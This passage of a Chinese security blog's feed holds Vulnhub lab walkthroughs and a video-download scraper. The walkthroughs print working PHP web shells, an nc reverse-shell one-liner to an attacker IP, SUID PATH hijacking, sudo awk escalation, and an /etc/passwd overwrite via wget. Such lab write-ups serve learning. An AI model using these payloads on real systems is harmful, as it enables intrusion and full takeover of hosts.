192.168.245.3 -U smb</em>  用命令尝试登陆三个用户后无果</p><p>   猜测目录可能被隐藏并可能在/home/smb/</p><p>   <em>smbclient //192.168.245.3/home/smb -U smb</em></p><p>   因为用这个软件登陆成功后用户的操作目录默认在自己的用户名目录中,并且登陆后不能切换用户 这里是 /smb中 </p><p>   所以:</p><p>​     <em>smbclient //192.168.245.3/smb -U smb</em></p><p>  登陆后可执行的命令有:</p><pre><code>?       allinfo    altname    archive    backup     blocksize   cancel     case_sensitive cd       chmod     chown     close     del      deltree    dir      du       echo      exit      get      getfacl    geteas     hardlink    help      history    iosize     lcd      link      lock      lowercase   ls       l       mask      md       mget      mkdir     more      mput      newer     notify     open      posix     posix_encrypt posix_open   posix_mkdir  posix_rmdir  posix_unlink  posix_whoami  print     prompt     put      pwd      q       queue     quit      readlink    rd       recurse    reget     rename     reput     rm       rmdir     showacls    setea     setmode    scopy     stat      symlink    tar      tarmode    timeout    translate   unlock     volume     vuid      wdel      logon     listconnect  showconnect  tcon     tdis      tid      utimes     logoff  .. 等</code></pre><p>因为不能用cd 切换到根目录,所以把有用的文件下载到本地,默认保存当前目录 命令: get 文件名 </p><p> 得到 main.txt safe.zip  </p><p> main.txt 没flag 解压safe.zip提示加密</p><p> 于是用fcracezip爆破密码:</p><p>  <em>fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u safe.zip  -&gt; hacker1</em></p><p> 解压文件 secret.jpg 用 xdg-open 打开  用exiftool工具打开后没什么可疑的数据</p><p>  用wireshark打开 user.cap 并没发现可用的信息 SSID=blackjax</p><p>  用aircrack-ng破解包:</p><p>  <em>aricrack-ng -w /usr/share/wordlist/rockyou.txt user.cap</em></p><p>  破解得到密码后 ssh登陆</p><p>  cat user.txt  拿到第一个flag:f589a6959f3e04037eb2b3eb0ff726ac</p><p>  第二个flag:</p><p>  查找可执行程序 <em>find / type f -perm -u=s 2&gt;/dev/null</em></p><pre><code>/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/openssh/ssh-keysign/usr/lib/policykit-1/polkit-agent-helper-1/usr/lib/snapd/snap-confine/usr/lib/i386-linux-gnu/lxc/lxc-user-nic/usr/lib/eject/dmcrypt-get-device/usr/bin/newgidmap/usr/bin/gpasswd/usr/bin/newuidmap/usr/bin/chfn/usr/bin/passwd/usr/bin/chsh/usr/bin/at/usr/bin/pkexec/usr/bin/newgrp/usr/bin/netscan/usr/bin/sudo/bin/ping6/bin/fusermount/bin/mount/bin/su/bin/ping/bin/umount/bin/ntfs-3g</code></pre><p> 发现有个 netscan 这个命令和 netstat -tnap 输出结果一样</p><pre><code> netstat -tnap:Proto Recv-Q Send-Q Local Address      Foreign Address     State    PID/Program nametcp    0   0 127.0.0.1:6010     0.0.0.0:*        LISTEN   -        tcp    0   0 0.0.0.0:445       0.0.0.0:*        LISTEN   -        tcp    0   0 0.0.0.0:2525      0.0.0.0:*        LISTEN   -        tcp    0   0 127.0.0.1:3306     0.0.0.0:*        LISTEN   -        tcp    0   0 0.0.0.0:139       0.0.0.0:*        LISTEN   -        tcp6    0   0 ::1:6010        :::*          LISTEN   -        tcp6    0   0 :::445         :::*          LISTEN   -        tcp6    0   0 :::2525         :::*          LISTEN   -        tcp6    0   0 :::139         :::*          LISTEN   -        tcp6    0   0 :::80          :::*          LISTEN   - Netscan:tcp    0   0 127.0.0.1:6010     0.0.0.0:*        LISTEN   2583/0     tcp    0   0 0.0.0.0:445       0.0.0.0:*        LISTEN   858/smbd    tcp    0   0 0.0.0.0:2525      0.0.0.0:*        LISTEN   1071/sshd    tcp    0   0 127.0.0.1:3306     0.0.0.0:*        LISTEN   1061/mysqld   tcp    0   0 0.0.0.0:139       0.0.0.0:*        LISTEN   858/smbd    tcp    0  296 192.168.245.3:2525   192.168.245.6:53400   ESTABLISHED 2521/sshd: blackjaxtcp6    0   0 ::1:6010        :::*          LISTEN   2583/0     tcp6    0   0 :::445         :::*          LISTEN   858/smbd    tcp6    0   0 :::2525         :::*          LISTEN   1071/sshd    tcp6    0   0 :::139         :::*          LISTEN   858/smbd    tcp6    0   0 :::80          :::*          LISTEN   1106/apache2</code></pre><p> 对比两个发现,netscan权限是更高的</p><p> 使用xxd工具也发现了netscan调用了netstat -tanp 命令: <em>xxd /usr/bin/netscan</em></p><p> 所以提权的思路就是: 执行netscan时会调用netstat命令,利用环境变量和netstat这个有执行权限的程序提权</p><p>  后台查找root用户的执行程序 : ps aux  得到 /bin/sh</p><p>  在 /tmp中创建文件: echo “/bin/sh” &gt; netscan</p><p>  添加执行权限:  chmod 777 netstat </p><p>  查询系统变量：echo $PATH</p><p>  添加环境变量: export PATH=/tmp:$PATH</p><p>  提升权限: netscan</p><p> cat root.txt  第二个flag:bae11ce4f67af91fa58576c1da2aad4b</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;  1.安装靶机&lt;/p&gt;
&lt;p&gt;  2.gobuster扫目录 并没有关键信息&lt;/p&gt;
&lt;p&gt;   nmap 扫端口服务及版本探测  开启敏感端口及服务&lt;/p&gt;
&lt;p&gt;&lt;em&gt;139/tcp open netbios-ssn Samba smbd 3.X - 4.X (wo
      
    
    </summary>
    
    
      <category term="Vulnhub靶场" scheme="http://perthinking.xyz/categories/Vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
    
  </entry>
  
  <entry>
    <title>Vulnhub靶场做题记录-OS-Hax</title>
    <link href="http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/3/"/>
    <id>http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/3/</id>
    <published>2020-06-30T12:31:13.000Z</published>
    <updated>2020-06-30T12:34:35.483Z</updated>
    
    <content type="html"><![CDATA[<p> 1.安装靶机后 用nmap或netdiscover得到靶机ip</p><p>  用gobuster扫到wordpress,img目录</p><p>  用wpscan扫 192.168.56.106/wordpress 目录 得到登陆后台</p><p>   img发现有可疑图片flaghost.png 用strings或exiftool工具看到可疑字符串pass@415</p><p>  访问wordpress主页 发现并不能加载js 随意点击主页中的链接变成了localhost://</p><p>  这时修改 本机 /etc/hosts 文件 添加:</p><p>   loaclhost  192.168.56.106 </p><p>  重新访问后js等加载了,页面有一个web用户</p><p>  尝试用web:pass@415登陆后台失败</p><p>  \2. 尝试访问 pass@415 目录 得到 brainfuck编码 得到web用户的密码</p><p>   登陆后台成功 修改Theme的配置文件  添加一句话  </p><pre><code> &lt;?php system($_REQUEST[&#39;leng&#39;]);?&gt;</code></pre><p>  3.反弹shell,切换到python3 shell </p><p>   cat /etc/passwd  发现有用户web </p><p>   su 切换到 web用户  </p><p>   sudo -l 查看当前用户可执行的程序 发现可执行 awk</p><p>​    (root) NOPASSWD: /usr/bin/awk</p><p>   在/etc/sudoers也可看到:</p><p>​     web   ALL= (root) NOPASSWD: /usr/bin/awk</p><p>   利用awk 提取  sudo awk ‘{system(“/bin/bash”)}’</p><p>   提权后cat final.txt</p><p>  flag: bae11ce4f67af91fa58576c1da2aad4b</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt; 1.安装靶机后 用nmap或netdiscover得到靶机ip&lt;/p&gt;
&lt;p&gt;  用gobuster扫到wordpress,img目录&lt;/p&gt;
&lt;p&gt;  用wpscan扫 192.168.56.106/wordpress 目录 得到登陆后台&lt;/p&gt;
&lt;p&gt;   img发现
      
    
    </summary>
    
    
      <category term="Vulnhub靶场" scheme="http://perthinking.xyz/categories/Vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
    
  </entry>
  
  <entry>
    <title>Vulnhub靶场做题记录-Trollcave</title>
    <link href="http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/2/"/>
    <id>http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/2/</id>
    <published>2020-06-30T12:20:03.000Z</published>
    <updated>2020-06-30T12:29:34.840Z</updated>
    
    <content type="html"><![CDATA[<p> 知识点: nmap gobuster py脚本的编写 密码重置漏洞 ssh配置文件上传拿shell ubuntu16.04.04 提权 </p><p>1.安装靶机后使用nmap探测目标ip</p><p> 访问后发现不能注册用户,只能登陆用户,显示了用户名和角色,并且有20个左右的用户</p><p> 尝试用不同的用户登陆,错误提示都不一样</p><p> 此时应该写脚本爬出用户名,角色以及用户名登陆的错误信息,并写入文本中</p><p> 爬出用户名以及角色:</p><pre><code>#coding:utf-8import requests,redef get_userinfo(id):  req = requests.get(&quot;http://192.168.56.101/users/%s&quot; % id).text  #&lt;h1&gt;King&#39;s page&lt;/h1&gt;    username = re.search(&#39;&lt;h1&gt;(.*?)\&#39;&#39;,req).group(1)  #&lt;b&gt;  #Superadmin  #&lt;/b&gt;  userlevel = re.search(&#39;\s&lt;b&gt;\s(.*?)\s&lt;/b&gt;&#39;,req).group(1)  return username,userlevelfor i in range(0,20):  try:​    username,userlevel = (get_userinfo(i))​    print(username + &#39;:&#39; + userlevel)  except:​    None</code></pre><p>  爬出用户名登陆后的错误提示:</p><pre><code>#coding:utf-8import requests,redef get_userinfo(id):  req = requests.get(&quot;http://192.168.56.101/users/%s&quot; % id).text  #&lt;h1&gt;King&#39;s page&lt;/h1&gt;    username = re.search(&#39;&lt;h1&gt;(.*?)\&#39;&#39;,req).group(1)  return usernamedef get_logininfo(username):  cookies = {&#39;_thirtytwo_session&#39;:&#39;OWdrYnNsYlZnWDFJc1N3ZlNFK0JtQm5jSUFzNDFCa21jclFBcEdiLzI0QmJtS1oxa1BLK3R4N1M4RW1JUmpYUVVrYU9idW81Q1daWk9aaHdLQy9xUGxMVmgwZS84M1M3TURvZm13ZWpuVjdTSUVBUHlxdUdtY3ovaVQ3N3RwdWZSdDM0ZHBiMnluc2tvZGRGREdlS2hnPT0tLWc0T3VlSUZYdEovTnI0dkNaOW5FL2c9PQ%3D%3D--52f1df3308000f03c63e7e03fe02314a87e98049&#39;}  data = {&#39;authenticity_token&#39;:&#39;swjwIMKazz6UsuWnxLDWXbiH7mIavPpg4DIth8HYE7Pxxgi9rd6sMCtVWVRTPWw3GAKIwJE2nqP+cD25N+UlkQ==&#39;,&#39;session[name]&#39;:username,&#39;session[password]&#39;:&#39;123&#39;,&#39;commit&#39;:&#39;Log in&#39;}   req2 = requests.post(&#39;http://192.168.56.101/login&#39;,data=data,cookies=cookies).text  usernotice = re.search(&#39;notice\&#39;&gt;(.*?)&lt;/div&gt;&#39;,req2).group(1)  return username,usernotice  #&lt;div id=&#39;notice&#39;&gt;:)&lt;/div&gt;for i in range(0,20):   try:​    username,usernotice = get_logininfo(get_userinfo(i))​    print(username + &#39;\t&#39; + usernotice)   except:​    None</code></pre><p> 2.查看页面发现有密码重置的文章,百度可知是用ruby语言写的一个web应用程序rails</p><p> 并且可以访问 password_resets/new 重置密码,但不能重置管理员的密码</p><p>  重置登陆后有一个文件管理可以上传文件,上传一句话发现不能上传</p><p>  File upload is currently disabled</p><p>  这时可能是权限不够,看到重置密码的邮箱是这样的:</p><p>  <a href="http://192.168.56.101/password_resets/edit.OqOhuUHgvZocJN8BH5MM_A?name=xer" target="_blank" rel="noopener">http://192.168.56.101/password_resets/edit.OqOhuUHgvZocJN8BH5MM_A?name=xer</a></p><p>  尝试修改King的密码 成功修改 属于密码重置漏洞</p><p>  然后设置可以上传文件 上传一句话后并不能解析 </p><p>  尝试上传到根目录也不能解析</p><p>  之前搜索到此网站是用ruby语言写的一个web应用程序,所以如果是php文件的话很大可 </p><p>能不会解析的</p><p> 3.第一步中nmap扫到22端口是开着的,所以尝试上传或替换ssh配置文件</p><p>  生成rail用户密钥: ssh-keygen -f rails  一个公钥 一个私钥</p><p>  将公钥重命名: mv rails.pub authorized_keys</p><p>  上传时的路径  ../../../../../../home/rails/.ssh/authorized_keys</p><p>  ssh登陆: ssh -i id_rsa-rails <a href="mailto:rails@192.168.56.101">rails@192.168.56.101</a></p><p>  bash命令切换终端  接着查询版本是否可提权</p><p>  cat /etc/lsb_release</p><p>  16.04 ubuntu 搜索此版本exp 下载后本地编译后对它进行base64加密下,复制到靶机上,再base64 -d cve.64 &gt; cve 最后运行即可提权到root</p><p> 或者直接复制到靶机上也行</p><p> flag: c0db34ce8adaa7c07d064cc1697e3d7cb8aec9d5a0c4809d5a0c4809b6be23044d15379c5</p><p> 第二种提权方法:</p><p> 查看可疑文件,将它们记下来: </p><p> 数据库账号密码在database.yml 并且是sqlite3数据库</p><p> 后缀为.sqlite的文件用命令进入数据库查询:</p><p> sqlite3 数据库文件名  查询到所有用户的用户名及密码</p><p> 查到可疑文件内容 private_messages: uFrrK3dXzWeZQ7JtGgZk4FT</p><p>  前面了解到,rails这个web应用在本地会开启一个 3000端口 用命令 netstat -tnlp 查看开启的端口,还有8888,5432端口.但是浏览器不能访问,curl可以</p><p> 于是做一个ssh端口转发:</p><p> ssh -Nfg -L 3000:192.168.56.104:3000 <a href="mailto:aleng@192.168.56.104">aleng@192.168.56.104</a></p><p> 可以端口转发后却不能访问…</p><p> 先留着,日后再做解答</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt; 知识点: nmap gobuster py脚本的编写 密码重置漏洞 ssh配置文件上传拿shell ubuntu16.04.04 提权 &lt;/p&gt;
&lt;p&gt;1.安装靶机后使用nmap探测目标ip&lt;/p&gt;
&lt;p&gt; 访问后发现不能注册用户,只能登陆用户,显示了用户名和角色,并且有
      
    
    </summary>
    
    
      <category term="Vulnhub靶场" scheme="http://perthinking.xyz/categories/Vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
    
  </entry>
  
  <entry>
    <title>Vulnhub靶场做题记录-Os-hackNos-1</title>
    <link href="http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/1/"/>
    <id>http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/1/</id>
    <published>2020-06-30T12:06:48.000Z</published>
    <updated>2020-06-30T12:16:39.155Z</updated>
    
    <content type="html"><![CDATA[<p> 知识点:</p><p> nmap,netdiscover的使用,gobuster爆破目录的使用,cms-exp的使用,getshell,反弹shell,linux的 提权</p><p>1.安装好靶机后,用以下命令探测靶机ip:</p><p>  nmap 192.168.56.0/24</p><p>  netdiscover -I eth0 -r 192.168.56.0/24</p><p> 这里有一个坑,指定ip段是扫不出来的,去掉就能扫出来</p><p><img src="/Vulnhub%E9%9D%B6%E5%9C%BA/1/1.png" alt=" "></p><p> 2.接着使用命令 nmap -sV -A -sC 192.168.56.102 -oA oshacknos1 探测操作系统和版本以及服务,将结果输出</p><p><img src="/Vulnhub%E9%9D%B6%E5%9C%BA/1/2.png" alt=" "></p><p>3.接着使用gobuster扫描目录 命令: </p><p>gobuster dir -u <a href="http://192.168.56.102" target="_blank" rel="noopener">http://192.168.56.102</a> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt</p><p><img src="/Vulnhub%E9%9D%B6%E5%9C%BA/1/3.png" alt=" "></p><p> drupal 访问后发现是一个cms 但是不能识别是什么版本,所以先官网下一个cms，看它有什么文件进而得到版本 经过测试发现版本是7.57</p><p> 去github搜索发现有一个exp</p><p>4.exp是任意命令执行的 ls命令有一个sites文件夹,进去后看到settings.php,cat下拿到数据库账号密码</p><p> 通过命令 创建一个shell文件,内容:</p><pre><code>&lt;?php system($_POST[&#39;a&#39;]);?&gt;</code></pre><p>  通过命令 python3 -m SimpleHTTPServer 8000  打开下载通道</p><p> 通过exp 下载shell文件到网站目录下 并确保可以执行命令</p><p>5.接下来反弹shell 在kali中使用nc -lvnp 9001进行监听</p><p> 然后使用命令</p><p>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.56.104 9001 &gt;/tmp/f</p><p>并且再burp中对它url编码</p><p><img src="/Vulnhub%E9%9D%B6%E5%9C%BA/1/4.png" alt=" "></p><p>收到shell:</p><p> <img src="/Vulnhub%E9%9D%B6%E5%9C%BA/1/5.png" alt=" "></p><p>但是不能访问tty 类似于终端的东西 通过以下命令创建伪终端解决这个问题</p><p> python3 -c ‘import pty;pty.spawn(“/bin/bash”)’   暗月教程中的命令</p><p>其中pty是伪终端程序 pty.spawn 生成一个进程并连接在控制终端</p><p> 可怎么都不能创建,后来发现是语法问题,不知道到我这就出问题了</p><p> python3 -c “import pty;pty.spawn(‘/bin/bash’)”</p><p> <img src="/Vulnhub%E9%9D%B6%E5%9C%BA/1/6.png" alt=" "></p><p>为了不让键入的命令显示出来,通过以下命令</p><p> stty raw -echo  在终端关闭命令的回显</p><p> nc -lvnp 9001</p><p> 不知为何教程中可以这样操作</p><p>第一个flag:</p><p> 既然如此,那就直接执行命令:</p><p> cat /etc/passwd</p><p> 发现有一个可疑用户 james</p><p> cd到这个用户目录 发现 user.txt 中有一串加密的md5 解密后得到第一个flag</p><p>第二个flag:</p><p> 发现可疑文件alexander.txt cat后并解密</p><pre><code> echo &quot;KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKysuLS0gLS0tLS0gLS0uPCsgKytbLT4gKysrPF0gPisrKy4KLS0tLS0gLS0tLjwgKysrWy0gPisrKzwgXT4rKysgKysuPCsgKysrKysgK1stPi0gLS0tLS0gLTxdPi0gLS0tLS0gLS0uPCsKKytbLT4gKysrPF0gPisrKysgKy48KysgKysrWy0gPisrKysgKzxdPi4gKysuKysgKysrKysgKy4tLS0gLS0tLjwgKysrWy0KPisrKzwgXT4rKysgKy48KysgKysrKysgWy0+LS0gLS0tLS0gPF0+LS4gPCsrK1sgLT4tLS0gPF0+LS0gLS4rLi0gLS0tLisKKysuPA==&quot; | base64 -d</code></pre><p> 得到</p><pre><code>+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++++ ++.-- ----- --.&lt;+ ++[-&gt; +++&lt;] &gt;+++.----- ---.&lt; +++[- &gt;+++&lt; ]&gt;+++ ++.&lt;+ +++++ +[-&gt;- ----- -&lt;]&gt;- ----- --.&lt;+++[-&gt; +++&lt;] &gt;++++ +.&lt;++ +++[- &gt;++++ +&lt;]&gt;. ++.++ +++++ +.--- ---.&lt; +++[-\&gt;+++&lt; ]&gt;+++ +.&lt;++ +++++ [-&gt;-- ----- &lt;]&gt;-. &lt;+++[ -&gt;--- &lt;]&gt;-- -.+.- ---.+++.</code></pre><p>查询后是brainfuck编码 解码后得到:james:Hacker@4514</p><p> su 切换用户 失败  ssh登陆 失败</p><p>接下来只能提权</p><p> 先查找有执行权限的程序: find / -perm -u=s -type f 2&gt;/dev/null</p><p> 发现wget 有执行权限</p><p> 所以通过替换靶机的/etc/passwd 切换用户拿到靶机的权限</p><p> 使用命令对一个用户的密码加密,然后添加到 /etc/passwd</p><p> openssl passwd -1 -salt leng 123456  -1 表示使用md5算法 -salt指定salt值,不适用 随机的salt值</p><p>  $1$leng$M/raGbgc7Roz2E4Mjjt1U0</p><p> 然后替换root:x:0:0:root:/root:/bin/bash 后得到</p><p> root:$1$leng$M/raGbgc7Roz2E4Mjjt1U0:0:0:root:/root:/bin/bash</p><p> 这样的话leng 这个用户就是root用户的权限</p><p> 最后使用命令 wget “<a href="http://192.168.56.104:8000/passwd&quot;" target="_blank" rel="noopener">http://192.168.56.104:8000/passwd&quot;</a> -O /etc/passwd 替换靶机/etc/passwd</p><p> 切换用户 leng 密码123456 成功拿到root权限</p><p><img src="/Vulnhub%E9%9D%B6%E5%9C%BA/1/7.png" alt=" "></p><p> 拿到flag:bae11ce4f67af91fa58576c1da2aad4b </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt; 知识点:&lt;/p&gt;
&lt;p&gt; nmap,netdiscover的使用,gobuster爆破目录的使用,cms-exp的使用,getshell,反弹shell,linux的 提权&lt;/p&gt;
&lt;p&gt;1.安装好靶机后,用以下命令探测靶机ip:&lt;/p&gt;
&lt;p&gt;  nmap 192.16
      
    
    </summary>
    
    
      <category term="Vulnhub靶场" scheme="http://perthinking.xyz/categories/Vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
    
  </entry>
  
  <entry>
    <title>如何爬取freebuf视频</title>
    <link href="http://perthinking.xyz/Python/1/"/>
    <id>http://perthinking.xyz/Python/1/</id>
    <published>2020-06-30T09:14:10.000Z</published>
    <updated>2020-06-30T12:02:01.001Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h1><p>注册了freebuf的账号,买了付费的课程,但是懒得每次打开浏览器点击,想爬取视频到本地观看的</p><p>下载了ffmpeg工具,专门合成加载了m3u8链接的视频</p><h1 id="爬取思路"><a href="#爬取思路" class="headerlink" title="爬取思路"></a>爬取思路</h1><p>获取视频标题  -&gt;  获取视频url   -&gt;  获取视频加载的m3u8的url   -&gt;   调取系统命令</p><h1 id="爬取解析"><a href="#爬取解析" class="headerlink" title="爬取解析"></a>爬取解析</h1><h2 id="视频标题"><a href="#视频标题" class="headerlink" title="视频标题"></a>视频标题</h2><p>比如这个CTF付费的课程,我这边是已经购买了的,就用它来试了</p><p><img src="/Python/1/1.png" alt></p><p><img src="/Python/1/2.png" alt></p><p>F12可以看到视频的标题,url等</p><p>原本打算用xpath获取的,发现不成功.后来知道它是动态页面,也就是它的标题和url在源代码中是看不到的</p><p>然后抓包看到它加载了一个json包,一看都包含了标题和url</p><p><img src="/Python/1/3.png" alt></p><p><img src="/Python/1/4.png" alt></p><p>所以就是怎么获取json中的数据问题了  那么肯定是要json模块去解析了,刚开始不懂,查了很多资料,发现以这样格式取的</p><pre><code>a=json.loads(b)c=a[][][][][]</code></pre><p>问题:标题在列表中的字典中,你怎么知道它有多少个列表?while循环就行了</p><pre><code>request = requests.get(url,headers=headers).textrequest_data = json.loads(request)#request_data[&#39;data&#39;][&#39;series_course&#39;][&#39;list&#39;][1][&#39;son&#39;][3][&#39;name&#39;]title_data = request_data[&#39;data&#39;][&#39;series_course&#39;][&#39;list&#39;]  m = 0  n = 0  title_name = []  while m &lt; len(title_data):​    while n &lt; len(title_data[m][&#39;son&#39;]):​      title_name.append(title_data[m][&#39;son&#39;][n][&#39;name&#39;])​      n += 1​    n = 0​    m += 1  return (title_name)</code></pre><p>效果:</p><p>这只是一部分</p><p><img src="/Python/1/5.png" alt></p><p>实践出真理,自己操作了才懂.</p><h2 id="视频url"><a href="#视频url" class="headerlink" title="视频url"></a>视频url</h2><p>同获取视频标题的url一样</p><p>问题:这样获取的url是相对的?加上host列表循环下就行了</p><pre><code>  host_url = &#39;https://live.freebuf.com&#39;  req = requests.get(url,headers=headers).text  data = json.loads(req)  \#data[&#39;data&#39;][&#39;series_course&#39;][&#39;list&#39;][1][&#39;son&#39;][0][&#39;url&#39;]  uri_data_one = data[&#39;data&#39;][&#39;series_course&#39;][&#39;list&#39;]  uri_one = []  k = 0  i = 0  while (k &lt; len(uri_data_one)):​    while i &lt; len(uri_data_one[k][&#39;son&#39;]):​      uri_one.append(uri_data_one[k][&#39;son&#39;][i][&#39;url&#39;])​      i += 1​    i = 0​    k += 1  url_one = [host_url + j for j in uri_one]</code></pre><p>效果</p><p><img src="/Python/1/6.png" alt></p><h2 id="视频的m3u8链接"><a href="#视频的m3u8链接" class="headerlink" title="视频的m3u8链接"></a>视频的m3u8链接</h2><p>到了这步,说明肯定获取了视频的url</p><p>访问视频url,F12中可以看到m3u8的链接,所以原本想法是selenium模块去请求的,发现好像无法操作.然后了解到使用了js去拼接了m3u8的链接,访问链接内容就是m3u8的链接.这里需要不断的抓包才能发现不一样的请求</p><p>比如 <a href="https://live.freebuf.com/live/0b230d3e53b72179d78d204b72769a85/s_621" target="_blank" rel="noopener">https://live.freebuf.com/live/0b230d3e53b72179d78d204b72769a85/s_621</a></p><p>开启抓包</p><p><img src="/Python/1/7.png" alt></p><p>接着forward包   发送了两次或三次就看到了这个包</p><p><img src="/Python/1/8.png" alt></p><p><img src="/Python/1/9.png" alt></p><p>换一个视频url请求  也不断地以这种方式发包,发现这个包的链接的末几位是变化的</p><p>问题:怎么获取最高清视频的m3u8链接?视频大小越大,越高清.所以先获取比较数据,从而得到列表的索引,取出数据</p><p>接下来就是想办法知道这个包的url是怎么动态获取的</p><p>然后抓取第一个包的时候就回显在js中</p><p><img src="/Python/1/10.png" alt></p><p>那个fileID就拼接在 getplayinfo/v2/1251001764 后面</p><p>所以到这思路就很明显了:   请求首页获取fileID,然后拼接url    具体的话实际操作便知</p><h2 id="调用系统命令"><a href="#调用系统命令" class="headerlink" title="调用系统命令"></a>调用系统命令</h2><p>这里就是对爬取的数据进行读取,然后启用命令即可,具体看代码</p><p>最后代码如下</p><pre><code>import requestsimport osimport jsonimport reurl = &quot;https://live.freebuf.com/course/detail/?id=0b230d3e53b72179d78d204b72769a85&quot;def download_video():  fo = open(&#39;video_data.txt&#39;,&#39;r&#39;,encoding=&#39;utf8&#39;)  for line in fo.readlines():​    filter_line = line.strip(&#39;\n&#39;)​    title = re.findall(&#39;^title:(.*) \+ url:+&#39;,filter_line)​    m3u8_url = re.findall(&#39; \+ m3u8:(.*)&#39;,filter_line)​    \#print (m3u8_url)​    cmd = &#39;D:\\ProgramFiles\\ffmpeg-20200608-d29aaf1-win64-static\\ffmpeg-20200608-d29aaf1-win64-static\\bin\\ffmpeg.exe -headers &#39; + &#39;&quot;Referer: https://live.freebuf.com/live/0b230d3e53b72179d78d204b72769a85/s_628&quot; &#39; + &#39;-i &#39; + m3u8_url[0] + &#39; -c copy &#39; + title[0] + &#39;.mp4&#39; ​    \#ffmpeg的路径,Referer,文件名根据实际情况更改​    \#print (cmd)​    os.system(cmd)def get_url():  headers = {  &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36&quot;  }  host_url = &#39;https://live.freebuf.com&#39;  req = requests.get(url,headers=headers).text  data = json.loads(req)  \#data[&#39;data&#39;][&#39;series_course&#39;][&#39;list&#39;][1][&#39;son&#39;][0][&#39;url&#39;]  uri_data_one = data[&#39;data&#39;][&#39;series_course&#39;][&#39;list&#39;]  uri_one = []  k = 0  i = 0  while (k &lt; len(uri_data_one)):​    while i &lt; len(uri_data_one[k][&#39;son&#39;]):​      uri_one.append(uri_data_one[k][&#39;son&#39;][i][&#39;url&#39;])​      i += 1​    i = 0​    k += 1  url_one = [host_url + j for j in uri_one]  return (url_one)def get_title():  headers = {  &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36&quot;  }  request = requests.get(url,headers=headers).text  request_data = json.loads(request)  \#request_data[&#39;data&#39;][&#39;series_course&#39;][&#39;list&#39;][1][&#39;son&#39;][3][&#39;name&#39;]  title_data = request_data[&#39;data&#39;][&#39;series_course&#39;][&#39;list&#39;]  m = 0  n = 0  title_name = []  while m &lt; len(title_data):​    while n &lt; len(title_data[m][&#39;son&#39;]):​      title_name.append(title_data[m][&#39;son&#39;][n][&#39;name&#39;])​      n += 1​    n = 0​    m += 1  return (title_name)def get_m3u8_url(url_one):  \#思路:1.访问-&gt;f5刷新-&gt;单击全高清-&gt;获取xhr链接 -&gt; 不可行  2.抓包获取  url_data = url_one  headers = {  &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36&quot;,  &quot;Cookie&quot;:&quot;your cookie&quot;  }  rel_m3u8_url = []  for g in url_data:​    url_test = g​    video_requests = requests.get(url=url_test,headers=headers).text​    result = re.findall(&#39;fileID: &quot;(.*?)&quot;&#39;,video_requests) #测试发现,部分data-id是无法获取的,无法获取的话就json无法请求url,从而报错.故用fileID,或者删除无法获取data-id的这个url​    playinfo_url = &#39;http://playvideo.qcloud.com/getplayinfo/v2/1251001764/&#39; + result[0]​    \#print (playinfo_url)​    playinfo_requests = requests.get(playinfo_url).text​    m3u8_info = json.loads(playinfo_requests)​    \#判断视频大小 取出m3u8链接:视频大小越大,越高清​    \#m3u8_url = m3u8_info[&#39;videoInfo&#39;][&#39;transcodeList&#39;][2][&#39;url&#39;]​    m3u8_url = m3u8_info[&#39;videoInfo&#39;][&#39;transcodeList&#39;]​    video_size = []​    for l in range(len(m3u8_url)):​      video_size.append(&#39;&#39;)​      video_size[int(l)] = m3u8_url[int(l)][&#39;size&#39;]​    index = video_size.index(max(video_size)) #得到索引​    rel_m3u8_url.append(m3u8_url[index][&#39;url&#39;])  return rel_m3u8_urlif __name__ == &#39;__main__&#39;:  title_name = get_title()  print (title_name)  url_one = get_url()  print (url_one)  rel_m3u8_url = get_m3u8_url(url_one)  print (rel_m3u8_url)  \#将数据写入文件  video_data = [(&#39;title:&#39; + title_name[y] + &#39; + url:&#39; + url_one[y] + &#39; + m3u8:&#39; + rel_m3u8_url[y] + &#39;\n&#39;) for y in range(0,len(title_name))]  \#print (video_data)  f = open(&#39;./video_data.txt&#39;,&#39;w+&#39;,encoding=&#39;utf-8&#39;)  for v in video_data:​    f.write(v)  f.close()  download_video()</code></pre><p>其中headers,ffmpeg根据你的情况自行修改</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前提&quot;&gt;&lt;a href=&quot;#前提&quot; class=&quot;headerlink&quot; title=&quot;前提&quot;&gt;&lt;/a&gt;前提&lt;/h1&gt;&lt;p&gt;注册了freebuf的账号,买了付费的课程,但是懒得每次打开浏览器点击,想爬取视频到本地观看的&lt;/p&gt;
&lt;p&gt;下载了ffmpeg工具,专门合
      
    
    </summary>
    
    
      <category term="Python" scheme="http://perthinking.xyz/categories/Python/"/>
    
    
  </entry>
  
  <entry>
    <title>Windows-PrintSpoofer提权</title>
    <link href="http://perthinking.xyz/Elevation/2/"/>
    <id>http://perthinking.xyz/Elevation/2/</id>
